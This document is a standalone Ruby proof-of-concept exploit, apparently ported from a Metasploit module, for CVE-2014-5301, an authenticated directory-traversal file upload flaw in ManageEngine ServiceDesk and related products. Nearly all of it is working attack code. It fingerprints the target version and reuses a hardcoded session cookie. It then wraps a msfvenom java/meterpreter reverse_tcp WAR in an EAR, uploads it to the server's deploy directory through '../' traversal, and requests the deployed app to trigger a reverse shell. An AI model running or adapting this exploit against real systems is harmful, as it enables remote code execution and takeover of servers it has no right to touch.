# ManageEngine Multiple Products Authenticated File Upload
#
# [CVE', '2014-5301'],
# ['OSVDB', '116733'],
# ['URL', 'http://seclists.org/fulldisclosure/2015/Jan/5']
#
# NOTE 1: This script is NOT a Metasplit Framework exploit module, but a standalone POC script exercise
# NOTE 2: Please observe that this script uses some of the Metasploit REX libraries, but not the Metasploit framework libraries.
# NOTE 3: This script is my first Ruby script and my first script using the Metasploit REX libraries (discovered after my start here)
# NOTE 4: The ManageEngine Metasploit module was leveraged to create it (some comments are not mine)
# NOTE 5: The Rex::MIME::Message.to_s method override may not work (or be needed) for all versions of the Rex::MIME::Message class. More 
# research/debug would be needed to determine the root cause(s) for the issue. In other words, the override may need to be removed or modified 
# depending on the version of your REX libraries. It was recommended a certain Kali instance be used in my case.
#
# Description from original exploit:
#        This module exploits a directory traversal vulnerability in ManageEngine ServiceDesk,
#        AssetExplorer, SupportCenter and IT360 when uploading attachment files. The JSP that accepts
#        the upload does not handle correctly '../' sequences, which can be abused to write
#        to the file system. Authentication is needed to exploit this vulnerability, but this module
#        will attempt to login using the default credentials for the administrator and guest
#        accounts. Alternatively, you can provide a pre-authenticated cookie or a username / password.
#        For IT360 targets, enter the RPORT of the ServiceDesk instance (usually 8400). All
#        versions of ServiceDesk prior v9 build 9031 (including MSP but excluding v4), AssetExplorer,
#        SupportCenter and IT360 (including MSP) are vulnerable. At the time of release of this
#        module, only ServiceDesk v9 has been fixed in build 9031 and above. This module has been
#        been tested successfully in Windows and Linux on several versions.
#
# Ported by: Jeff Berry
# Tested on: MS Windows 2008 Server and ManageEngine Service Desk Plus 7.6.0

  require 'rubygems'    
  require "net/http"
  require "net/http/requests"
  require "httpclient/util"
  require "rex/proto/http"
  require "rex/proto/http/client"
  require 'addressable/uri'
  require 'rex/zip'
  require 'rex/mime'
  require 'rex/text'

  $NetHTTPCall = 'False'
  $JSESSIONID = 'CEBA77FBE4BA1ABB9D511181CA0D7B98' #example machine required JSESSIONID to ManageEngine site
  $IPADDRESS = '192.168.0.2'
  $PORT = '8080'
  $IPADDRESSPORT = $IPADDRESS + ':' + $PORT
  $DOMAIN_NAME = nil
  $IAMAGENTTICKET = nil
  $my_target = nil

  # JB: This script requires exploit payload war file as input
  # msfvenom -p java/meterpreter/reverse_tcp LHOST=<listen ip address> LPORT=4444 -f war > shell.war
  $warfile = 'shell.war'  

  $targets =        [
          [ 'Automatic', { } ],
          [ 'ServiceDesk Plus v5-v7.1 < b7016/AssetExplorer v4/SupportCenter v5-v7.9',
            {
              'attachment_path' => '/workorder/Attachment.jsp'
            }
          ],
          [ 'ServiceDesk Plus/Plus MSP v7.1 >= b7016 - v9.0 < b9031/AssetExplorer v5-v6.1',
            {
              'attachment_path' => '/common/FileAttachment.jsp'
            }
          ],
          [ 'IT360 v8-v10.4',
            {
              'attachment_path' => '/common/FileAttachment.jsp'
            }
          ]
        ]

  # JB: The Rex::MIME::Message class replaces CRLF strings for SMTP compatibility but it "corrupts" HTTP payload
  # An override was done on the Rex::MIME::Message.to_s method to comment it out.
  class MIMEMess < Rex::MIME::Message  
    def to_s  
      msg = self.header.to_s + "\r\n"

      if self.content and not self.content.empty?
        msg << self.content + "\r\n"
      end

      self.parts.each do |part|
        msg << "--" + self.bound + "\r\n"
        msg << part.to_s + "\r\n"
      end

      if self.parts.length > 0
        msg << "--" + self.bound + "--\r\n"
      end

      # JB: Commented since it corrupted the HTTP payload
      # Force CRLF for SMTP compatibility
      # msg.gsub("\r", '').gsub("\n", "\r\n")

      # JB: Replacement line for the code above
      msg.gsub("\r\n--_Part_","--_Part_")

    end  
  end 

  def get_version

    uri = URI('http://' + $IPADDRESSPORT)
    res = Net::HTTP.get_response(uri)

    # Major version, minor version, build and product (sd = servicedesk; ae = assetexplorer; sc = supportcenterl; it = it360)
    version = [ 9999, 9999, 0, 'sd' ]

    if res && res.code == 200
      if res.body.to_s =~ /ManageEngine ServiceDesk/
        if res.body.to_s =~ /&nbsp;&nbsp;\|&nbsp;&nbsp;([0-9]{1}\.{1}[0-9]{1}\.?[0-9]*)/
          output = $1
          version = [output[0].to_i, output[2].to_i, '0', 'sd']
        end
        if res.body.to_s =~ /src='\/scripts\/Login\.js\?([0-9]+)'><\/script>/     # newer builds
          version[2] = $1.to_i
        elsif res.body.to_s =~ /'\/style\/style\.css', '([0-9]+)'\);<\/script>/   # older builds
          version[2] = $1.to_i
        end
      elsif res.body.to_s =~ /ManageEngine AssetExplorer/
        if res.body.to_s =~ /ManageEngine AssetExplorer &nbsp;([0-9]{1}\.{1}[0-9]{1}\.?[0-9]*)/ ||
            res.body.to_s =~ /<div class="login-versioninfo">version&nbsp;([0-9]{1}\.{1}[0-9]{1}\.?[0-9]*)<\/div>/
          output = $1
          version = [output[0].to_i, output[2].to_i, 0, 'ae']
        end
        if res.body.to_s =~ /src="\/scripts\/ClientLogger\.js\?([0-9]+)"><\/script>/
          version[2] = $1.to_i
        end
      elsif res.body.to_s =~ /ManageEngine SupportCenter Plus/
        # All of the vulnerable sc installations are "old style", so we don't care about the major / minor version
        version[3] = 'sc'
        if res.body.to_s =~ /'\/style\/style\.css', '([0-9]+)'\);<\/script>/
          # ... but get the build number if we can find it
          version[2] = $1.to_i
        end
      elsif res.body.to_s =~ /\/console\/ConsoleMain\.cc/
        # IT360 newer versions
        version[3] = 'it'
      end
    elsif res && res.code == 302 && res.get_cookies.to_s =~ /$IAMAGENTTICKET([A-Z]{0,4})/
      # IT360 older versions, not a very good detection string but there is no alternative?
      version[3] = 'it'
    end
    res = nil
    version
  end


  def check
    version = get_version
    # TODO: put fixed version on the two ifs below once (if...) products are fixed
    # sd was fixed on build 9031
    # ae and sc still not fixed
    if (version[0] <= 9 && version[0] > 4 && version[2] < 9031 && version[3] == 'sd') ||
    (version[0] <= 6 && version[2] < 99999 && version[3] == 'ae') ||
    (version[3] == 'sc' && version[2] < 99999)
      return 'Appears'
    end

    if (version[2] > 9030 && version[3] == 'sd') ||
        (version[2] > 99999 && version[3] == 'ae') ||
        (version[2] > 99999 && version[3] == 'sc')
      return 'Safe'
    else
      # An IT360 check always lands here, there is no way to get the version easily
      return 'Unknown'
    end
  end

  def pick_target
#    return target if target.name != 'Automatic'
    version = get_version
    if (version[0] <= 7 && version[2] < 7016 && version[3] == 'sd') ||
    (version[0] == 4 && version[3] == 'ae') ||
    (version[3] == 'sc')
      # These are all "old style" versions (sc is always old style)
      return $targets[1]
    elsif version[3] == 'it'
      return $targets[3]
    else
      return $targets[2]
    end
  end
  def print_status(msg = '')
    print_line("#{msg}")
  end
  def print_line(msg = '')
    print(msg + "\n")
  end

  def rand_text_alphanumeric(len, bad='')
    foo = []
    foo += ('A' .. 'Z').to_a
    foo += ('a' .. 'z').to_a
    foo += ('0' .. '9').to_a
    rand_base(len, bad, *foo )
  end

  def rand_base(len, bad, *foo)
    cset = (foo.join.unpack("C*") - bad.to_s.unpack("C*")).uniq
    return "" if cset.length == 0
    outp = []
    len.times { outp << cset[rand(cset.length)] }
    outp.pack("C*")
 end

 def self.rand_text_alpha(len, bad='')
   foo = []
   foo += ('A' .. 'Z').to_a
   foo += ('a' .. 'z').to_a
   rand_base(len, bad, *foo )
 end

 def send_multipart_request(cookie, payload_name, payload_str)
   if payload_name =~ /\.ear/
     upload_path = '../../server/default/deploy'
   else
     upload_path = rand_text_alpha(4+rand(4))
   end

   post_data = MIMEMess.new
   b = post_data.bound.to_s
   h = post_data.header.to_s

   rname1 = Rex::Text.rand_text_alpha(4+rand(4))

   if $my_target == $targets[1]
     # old style
     post_data.add_part(payload_str, 'application/octet-stream', 'binary', "form-data; name=\"#{rname1}\"; filename=\"#{payload_name}\"")
     post_data.add_part(payload_name, nil, nil, "form-data; name=\"filename\"")
     post_data.add_part('', nil, nil, "form-data; name=\"vecPath\"")
     post_data.add_part('', nil, nil, "form-data; name=\"vec\"")
     post_data.add_part('AttachFile', nil, nil, "form-data; name=\"theSubmit\"")
     post_data.add_part('WorkOrderForm', nil, nil, "form-data; name=\"formName\"")
     post_data.add_part(upload_path, nil, nil, "form-data; name=\"component\"")
     post_data.add_part('Attach', nil, nil, "form-data; name=\"ATTACH\"")
   else
     post_data.add_part(upload_path, nil, nil, "form-data; name=\"module\"")
     post_data.add_part(payload_str, 'application/octet-stream', 'binary', "form-data; name=\"#{rname1}\"; filename=\"#{payload_name}\"")
     post_data.add_part('', nil, nil, "form-data; name=\"att_desc\"")
   end
   data = post_data.to_s

# JB: Code to data corruption in HTTP message to target which is related to Rex::MIME::Message.to_s method override above
# It seemed wrong to remove even though the override takes care of the issue
# Wireshark is a handy tool if you have the patience to debug TCP messages ;)
##############################################################################################################################
#   att_desc_string = "--" + b + "\r\nContent-Disposition: form-data; name=\"att_desc\""

   # By itself, this line allows http upload to complete on target machine but file is corrupted (will not extract with "Jar xvf" app or Windows uncompress file command)
   #data = data.gsub("\r\n--_Part_","--_Part_")

   # By itself, this line does not allow http upload to complete; targets start characters of form variable which is after the upload file data to remove line feed and carriage return  
   #data = data.gsub("\r\n" + att_desc_string, att_desc_string)
##############################################################################################################################

   header = ({'User-Agent' =>'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', "Cookie" => cookie, 'Accept-Encoding' => '*', 'Connection' => 'keep-alive', 'Content-Type' => "multipart/form-data; boundary=#{b}" }) #, "Content-Length" => "2050", 'Accept-Encoding' => '*', 'Accept' => 'undefined', 'Accept-Encoding' => 'undefined'

    if $NetHTTPCall == 'True'

      uri = URI.parse('http://' + $IPADDRESSPORT + $my_target[1]["attachment_path"])
      req = Net::HTTP::Post.new(uri.request_uri, header)
      req.body = data
      reqbody = req.body
      reqbodylen = reqbody.bytesize
      strreqbodylen = reqbodylen.to_s

      res = http.request(req)

    else
       print_status('send_request_cgi called')

      uri = URI.parse($my_target[1]["attachment_path"])
      cli = Rex::Proto::Http::Client.new($IPADDRESS, $PORT, {}, nil, nil, nil)
      cli.connect
      req = cli.request_cgi({
        'uri'=> 'http://' + $IPADDRESSPORT + $my_target[1]["attachment_path"],
        'method' => 'POST',
        'data' => data,
        'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
        'cookie' => cookie
      })
      res = cli.send_recv(req)
      cli.close

    end

    return res
  end

# Start of main
checkstatus = check
print_status(checkstatus)

print_status("Selecting target...")
$my_target = pick_target
print_status("$my_target=" + $my_target.to_s)

# Do we already have a valid cookie? If yes, just return that.
if $JSESSIONID != nil
  cookie = 'JSESSIONID=' + $JSESSIONID.to_s + ';'
end

print_status(cookie)

if cookie.nil?
  fail_with(Failure::Unknown, "#{peer} - Failed to authenticate")
end

#Random text strings
rts1 = rand_text_alphanumeric(4 + rand(32 - 4)) # war_app_base
rts2 = rand_text_alphanumeric(4 + rand(32 - 4)) # ear_app_base
rts3 = rand_text_alphanumeric(4 + rand(32 - 4)) # display-name
rts4 = rand_text_alphanumeric(4 + rand(32 - 4)) # ear_file_name
rts5 = rand_text_alphanumeric(4 + rand(32 - 4)) # send_multipart_request var2
rts6 = rand_text_alphanumeric(4 + rand(32 - 4)) # send_multipart_request var3
rts7 = Rex::Text.rand_text_alpha(rand(8)+8) # uri var3

# First we generate the WAR with the payload...
war_app_base = rts1

# Read in the war file created by msfvenom
file = File.open($warfile, "rb")
war_payload = file.read.to_s

# ... and then we create an EAR file that will contain it.
ear_app_base = rts2
app_xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
app_xml << '<application>'
app_xml << "<display-name>#{rts3}</display-name>"
app_xml << "<module><web><web-uri>#{war_app_base + ".war"}</web-uri>"
app_xml << "<context-root>/#{ear_app_base}</context-root></web></module></application>"

# Zipping with CM_STORE to avoid errors while decompressing the zip
# in the Java vulnerable application
ear_file = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)
ear_file.add_file(war_app_base + '.war', war_payload.to_s)
ear_file.add_file('META-INF/application.xml', app_xml)
ear_file_name = rts4 + '.ear'

# For debug of ear file 
#File.open('codewar.ear', 'wb') { |file| file.write(ear_file.pack) }

if $my_target != $targets[3]
  # Linux doesn't like it when we traverse non existing directories,
  # so let's create them by sending some random data before the EAR.
  # (IT360 does not have a Linux version so we skip the bogus file for it)
  print_status("Uploading bogus file...")
  res = send_multipart_request(cookie, rts5, rts6)
  print_status('res.code=' + res.code.to_s)
  if res.code.to_s != '200'
    print_status("Bogus file upload failed")
  end
end

# Now send the actual payload
print_status("Uploading EAR file...")
res = send_multipart_request(cookie, ear_file_name, ear_file.pack)
print_status('res.code=' + res.code.to_s)

if res.code.to_s == '200'
  print_status("Upload appears to have been successful")
else
  print_status("EAR upload failed")
end

10.times do
  select(nil, nil, nil, 2)

  # Now make a request to trigger the newly deployed war
  print_status("Attempting to launch payload in deployed WAR...")

  uri = URI.parse('http://' + $IPADDRESSPORT + "/" + ear_app_base + "/" + war_app_base + "/" + rts7)
  req = Net::HTTP::Get.new(uri)
  req['Content-Type'] = 'application/x-www-form-urlencoded'
  req['User-Agent'] = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'

  res = Net::HTTP.start(uri.hostname, uri.port) {|http|
    http.request(req)
  }

  print_status('res.code=' + res.code.to_s)
  # Failure. The request timed out or the server went away.
  break if res.nil?
  # Success! Triggered the payload, should have a shell incoming
  break if res.code.to_s == '200'
end

